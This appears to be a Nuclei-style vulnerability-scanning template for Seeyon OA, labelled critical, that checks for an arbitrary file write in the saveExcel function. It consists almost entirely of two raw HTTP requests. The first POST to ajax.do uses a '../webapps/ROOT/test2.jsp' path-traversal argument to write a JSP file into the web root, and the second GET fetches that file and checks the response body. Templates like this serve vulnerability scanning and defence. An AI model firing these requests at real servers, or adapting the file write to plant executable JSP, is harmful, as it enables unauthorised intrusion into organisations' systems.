id: seeyon-ajax-filewrite
info:
  name: seesyon-ajax-filewrite
  author: apple
  severity: critical
  description: 致远OA-saveExcel任意文件写入
  reference:
    - https://mp.weixin.qq.com/s/gYo8NteAd8vfgMDzcoEcWg
  tags: seeyon
http:
  - raw:
      - |-
        POST /seeyon/ajax.do;JSESSIONID=chat?method=ajaxAction&managerName=fileToExcelManager&rnd=12700 HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: max-age=0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, ; q=.2, */; q=.2
        Content-Length: 95
        Connection: close

        managerMethod=saveExcelInBase&arguments=["../webapps/ROOT/test2.jsp","",{"columnName":["123"]}]
      - |-
        GET /test2.jsp HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: max-age=0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, ; q=.2, */; q=.2
        Content-Length: 95
        Connection: close
    matchers:
      - type: word
        part: body
        words:
          - '123'
